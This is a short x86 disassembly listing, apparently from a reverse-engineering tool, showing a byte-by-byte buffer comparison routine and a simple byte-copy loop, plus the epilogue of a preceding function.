pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
mov esi, dword [arg_8h]
mov ebx, dword [arg_ch]
mov ecx, dword [arg_10h]
xor edx, edx
cmp edx, ecx
jge 0x8048c0b
mov al, byte [edx + ebx]
cmp byte [edx + esi], al
je 0x8048c06
xor eax, eax
jmp 0x8048c10
inc edx
cmp edx, ecx
jl 0x8048bfa
mov eax, 1
lea esp, [var_8h]
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ebx, dword [arg_8h]
mov ecx, dword [arg_ch]
test edx, edx
jle 0x8048c79
lea esi, [esi]
mov al, byte [ecx]
mov byte [ebx], al
inc ebx
inc ecx
dec edx
test edx, edx
jg 0x8048c6e
mov ebx, dword [var_4h]
leave
ret
